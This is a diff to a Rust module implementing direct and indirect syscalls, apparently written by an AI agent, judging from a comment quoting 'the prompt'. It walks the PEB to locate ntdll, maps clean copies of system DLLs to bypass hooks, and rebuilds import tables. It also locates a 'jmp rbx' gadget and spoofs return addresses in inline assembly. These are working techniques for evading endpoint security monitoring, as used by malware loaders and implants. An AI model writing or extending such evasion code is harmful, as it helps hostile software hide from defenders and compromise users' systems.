@@ -1,9 +1,44 @@
+
+
 //! Direct/Indirect syscalls for Windows and Linux.
 #![cfg(all(
     any(windows, target_os = "linux"),
     any(target_arch = "x86_64", target_arch = "aarch64"),
     feature = "direct-syscalls"
 ))]
+
+#[repr(C)]
+struct PEB {
+    InheritedAddressSpace: u8,
+    ReadImageFileExecOptions: u8,
+    BeingDebugged: u8,
+    BitFields: u8,
+    Mutant: *mut std::os::raw::c_void,
+    ImageBaseAddress: *mut std::os::raw::c_void,
+    Ldr: *mut PEB_LDR_DATA,
+}
+
+#[repr(C)]
+struct PEB_LDR_DATA {
+    Length: u32,
+    Initialized: u8,
+    SsHandle: *mut std::os::raw::c_void,
+    InLoadOrderModuleList: winapi::shared::ntdef::LIST_ENTRY,
+    InMemoryOrderModuleList: winapi::shared::ntdef::LIST_ENTRY,
+    InInitializationOrderModuleList: winapi::shared::ntdef::LIST_ENTRY,
+}
+
+#[repr(C)]
+struct LDR_DATA_TABLE_ENTRY {
+    InLoadOrderLinks: winapi::shared::ntdef::LIST_ENTRY,
+    InMemoryOrderLinks: winapi::shared::ntdef::LIST_ENTRY,
+    InInitializationOrderLinks: winapi::shared::ntdef::LIST_ENTRY,
+    DllBase: *mut std::os::raw::c_void,
+    EntryPoint: *mut std::os::raw::c_void,
+    SizeOfImage: u32,
+    FullDllName: winapi::shared::ntdef::UNICODE_STRING,
+    BaseDllName: winapi::shared::ntdef::UNICODE_STRING,
+}
 
 use anyhow::{anyhow, Result};
 use std::arch::asm;
@@ -119,7 +154,9 @@ fn map_clean_ntdll() -> Result<usize> {
         // Wait, the prompt says "remove all references to the loaded module's export table". 
         // We can just scan PEB -> Ldr for ntdll and scan the loaded .text section for 0x0F 0x05 without parsing exports!
         let loaded_ntdll_base = {
-            use winapi::um::winnt::{TEB, PEB};
+            use winapi::um::winnt::NT_TIB;
+            // TEB/PEB are in winapi::um::winternl
+            // using raw pointers instead of winternl PEB
             let peb: *const PEB;
             asm!(
                 "mov {}, gs:[0x60]",
@@ -127,14 +164,14 @@ fn map_clean_ntdll() -> Result<usize> {
                 options(pure, nomem, nostack)
             );
             let ldr = (*peb).Ldr;
-            let head = &(*ldr).InMemoryOrderModuleList as *const winapi::shared::ntdef::LIST_ENTRY;
+            let head = &(*ldr).InMemoryOrderModuleList as *const _ as *mut winapi::shared::ntdef::LIST_ENTRY;
             let mut curr = (*head).Flink;
             let mut found_base = 0;
             // First entry is usually the executable, second is ntdll
             while curr != head {
                 let entry = curr as *const u8;
                 // InMemoryOrder links are at offset 0x10 compared to LDR_DATA_TABLE_ENTRY base
-                let dll_base_ptr = entry.add(0x30 - 0x10) as *const *mut winapi::shared::ntdef::c_void;
+                let dll_base_ptr = entry.add(0x30 - 0x10) as *const *mut std::os::raw::c_void;
                 let full_name_ptr = entry.add(0x48 - 0x10) as *const winapi::shared::ntdef::UNICODE_STRING;
                 
                 let base = *dll_base_ptr;
@@ -166,7 +203,7 @@ fn map_clean_ntdll() -> Result<usize> {
             let name = &section.Name;
             if name[0] == b'.' && name[1] == b't' && name[2] == b'e' && name[3] == b'x' && name[4] == b't' {
                 let start = loaded_ntdll_base + section.VirtualAddress as usize;
-                let size = section.Misc.VirtualSize() as usize;
+                let size = *section.Misc.VirtualSize() as usize;
                 let code = std::slice::from_raw_parts(start as *const u8, size);
                 for j in 0..size.saturating_sub(1) {
                     if code[j] == 0x0f && code[j+1] == 0x05 {
@@ -350,7 +387,7 @@ pub unsafe fn do_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
             "lea rdi, [rsp + 0x28]",
             "cld",
             "rep movsq",
-            "2:",
+            "4:",
             "mov rcx, {a1}",
             "mov rdx, {a2}",
             "mov r10, rcx",
@@ -546,7 +583,7 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
         let dep_handle = if is_critical {
             // map recursively clean
             match map_clean_dll(&dll_lower) {
-                Ok(b) => b as *mut winapi::shared::minwindef::HMODULE__,
+                Ok(b) => b as *mut winapi::shared::minwindef::HINSTANCE__,
                 Err(_) => {
                     let h_kernel = {
                         let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_string());
@@ -563,14 +600,14 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
         };
         
         if !dep_handle.is_null() {
-            let original_thunk_rva = if (*import_desc).OriginalFirstThunk != 0 { (*import_desc).OriginalFirstThunk } else { (*import_desc).FirstThunk };
+            let original_thunk_rva = if *(*import_desc).u.OriginalFirstThunk() != 0 { *(*import_desc).u.OriginalFirstThunk() } else { (*import_desc).FirstThunk };
             let mut original_thunk = (base + original_thunk_rva as usize) as *const winapi::um::winnt::IMAGE_THUNK_DATA64;
             let mut first_thunk = (base + (*import_desc).FirstThunk as usize) as *mut winapi::um::winnt::IMAGE_THUNK_DATA64;
             
             // Make IAT writable
             let mut num_thunks = 0;
             let mut temp_thunk = first_thunk;
-            while !(*temp_thunk).u1.AddressOfData().is_null() {
+            while (*temp_thunk).u1.AddressOfData() != &0 {
                 num_thunks += 1;
                 temp_thunk = temp_thunk.add(1);
             }
@@ -579,7 +616,7 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
             let mut old_protect = 0;
             winapi::um::memoryapi::VirtualProtect(first_thunk as *mut _, iat_size, winapi::um::winnt::PAGE_READWRITE, &mut old_protect);
             
-            while !(*original_thunk).u1.AddressOfData().is_null() {
+            while (*original_thunk).u1.AddressOfData() != &0 {
                 let addr_of_data = *(*original_thunk).u1.AddressOfData() as u64;
                 let proc_addr = if (addr_of_data & winapi::um::winnt::IMAGE_ORDINAL_FLAG64) != 0 {
                     let ordinal = (addr_of_data & 0xFFFF) as u16;
@@ -972,7 +1009,7 @@ pub unsafe extern "C" fn get_spoof_ret() -> usize {
 
 #[cfg(windows)]
 pub fn find_jmp_rbx_gadget() -> usize {
-    let base = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL).unwrap_or(0) as *mut _ } as usize;
+    let base = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL).unwrap_or(0) as *mut std::os::raw::c_void } as usize;
     if base == 0 { return 0; }
     let dos_header = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
     let nt_headers = (base + unsafe { *dos_header }.e_lfanew as usize) as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
@@ -1019,14 +1056,14 @@ pub unsafe fn spoof_call(api_addr: usize, gadget_addr: usize, arg1: u64, arg2: u
         "sub rsp, rax",
         
         "test {nstack}, {nstack}",
-        "jz 1f",
+        "jz 3f",
         "mov rcx, {nstack}",
         "mov rsi, {stack_ptr}",
         "lea rdi, [rsp + 0x28]",
         "cld",
         "rep movsq",
         
-        "1:",
+        "3:",
         "mov rcx, {a1}",
         "mov rdx, {a2}",
         "mov r8, {a3}",
@@ -1047,7 +1084,7 @@ pub unsafe fn spoof_call(api_addr: usize, gadget_addr: usize, arg1: u64, arg2: u
         // Jump to TLS return address
         "jmp {real_ret}",
         
-        "2:", // The real return address recorded in TLS
+        "4:", // The real return address recorded in TLS
         "mov {status_out}, rax",
         
         api = in(reg) api_addr,
